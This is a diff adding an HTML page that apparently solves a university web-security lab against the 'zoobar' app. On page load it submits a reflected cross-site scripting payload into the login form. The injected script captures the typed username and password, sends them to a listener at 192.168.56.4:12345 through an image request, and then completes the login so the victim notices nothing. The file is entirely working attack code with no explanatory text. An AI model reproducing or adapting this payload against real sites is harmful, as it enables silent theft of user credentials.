@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script>
+            function hack() {
+                document.getElementsByName("login_username")[0].value = '"></td><script>var hasSent = false; document.getElementsByName("login_username")[0].value = ""; document.getElementsByName("login_username")[0].addEventListener("focus", init, false); function init(){document.getElementsByName("submit_login")[0].addEventListener("click", sendPayload, false);} function sendPayload(e){e.preventDefault(); var im = new Image(); im.onerror = function (){hasSent = true;}; im.src = "http://192.168.56.4:12345?payload=" \+ document.getElementsByName("login_username")[0].value \+ "%3B" \+ document.getElementsByName("login_password")[0].value \+ "&roll=11907736&random=" \+ Math.random(); if (!hasSent){wait4it();} document.getElementsByName("submit_login")[0].removeEventListener("click", sendPayload, false);} function wait4it(){if (!hasSent){setTimeout("wait4it()", 100);} else {document.getElementsByName("submit_login")[0].click();}}<\/script><td style="display:none';
+                document.getElementsByName("postloginusername")[0].submit();
+                }
+            </script>
+        </head>
+        <body onload="hack();">
+            <form method="POST" name="postloginusername" action="http://localhost:8080/zoobar/index.cgi/login">
+                <input name="login_username" type="text" value="" >
+            </form>
+        </body>
+    </html>
